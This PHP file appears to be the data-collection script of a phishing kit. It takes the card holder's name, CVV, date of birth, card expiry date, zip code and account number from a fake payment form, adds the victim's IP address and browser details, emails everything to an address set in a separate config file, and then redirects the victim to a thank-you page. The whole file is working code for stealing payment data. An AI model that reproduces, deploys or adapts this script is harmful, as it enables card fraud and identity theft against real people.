<?php
include("../config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$pes .= "------------+| It's now easier to shop |+------------\n";

$pes .= "Full Name          : ".$_POST['CHName1']."\n";
$pes .= "3sec²          : ".$_POST['cvv2']."\n";
$pes .= "dob²          : ".$_POST['dob']."\n";
$pes .= "²erex²               : ".$_POST['expdate']."\n";
$pes .= "C Lim²           : ".$_POST['zip']."\n";
$pes .= "OCID²         : ".$_POST['OSID']."\n";
$pes .= "Account n²        : ".$_POST['accn']."\n";
$pes .= "------------+| We offer free global returns with pick-up service. |+------------\n";
$pes .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";
$pes .= "System Down :  $useragent   \n";


$bilsub = "VBV/SEC LS $ip";
$bilhead = "From: VB LS <prodection@bader.com>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead = "X-Mailer: PHP/".phpversion();
$bilhead .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$bilhead .= "MIME-Version: 2.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$pes,$bilhead);

header("Location: ../rthanks.php?Go=_Payment_loa_Processing&_SESSION=d2b1a896a29a6af53a2f0d41f0c705e2ee17233d");
?>